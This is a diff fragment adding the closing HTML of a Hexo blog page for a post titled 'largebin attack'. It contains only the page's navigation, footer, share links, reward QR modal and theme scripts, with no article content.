+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/08/31/rsk0kc/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">pipe</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/08/24/tirefu/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">SecTalks: BNE0x00 - Minotaur</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/08/27/mdrz9g/&title=《largebin attack》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/08/27/mdrz9g/&title=《largebin attack》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/08/27/mdrz9g/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《largebin attack》 — yichen's blog&url=https://yichen115.github.io/2020/08/27/mdrz9g/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/08/27/mdrz9g/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/08/27/mdrz9g/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
